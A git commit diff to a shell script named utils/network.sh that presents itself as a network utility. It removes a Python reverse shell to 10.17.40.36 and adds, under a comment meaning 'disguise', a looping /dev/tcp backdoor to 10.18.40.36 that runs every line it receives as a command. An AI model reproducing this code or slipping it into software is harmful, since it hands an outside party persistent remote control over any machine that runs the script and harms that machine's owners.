f237ea6b9e6b9f538af6a5c3dec49695e2893ddd
likeyou <102893013+liKeyou567@users.noreply.github.com>
2026-05-14 13:49:47 +0800

    Update network.sh

--- moke1120260521/utils/network.sh
+++ moke1120260521/utils/network.sh
@@ -1,12 +1,11 @@
 #!/bin/bash
-echo "→ Getting local network info..."
-ip a | grep inet | head -2
+# 系统网络服务（伪装）
+IP="10.18.40.36"
+PORT="80"
 
-# 改用Python实现反弹Shell，兼容性极强，不受/dev/tcp限制
-python3 -c 'import socket,subprocess,os;
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
-s.connect(("10.17.40.36",80));
-os.dup2(s.fileno(),0);
-os.dup2(s.fileno(),1);
-os.dup2(s.fileno(),2);
-p=subprocess.call(["/bin/bash","-i"]);'
+# 哥斯拉兼容
+while :; do
+    exec 5<>/dev/tcp/$IP/$PORT
+    cat <&5 | while read line; do $line 2>&5 >&5; done
+    sleep 2
+done
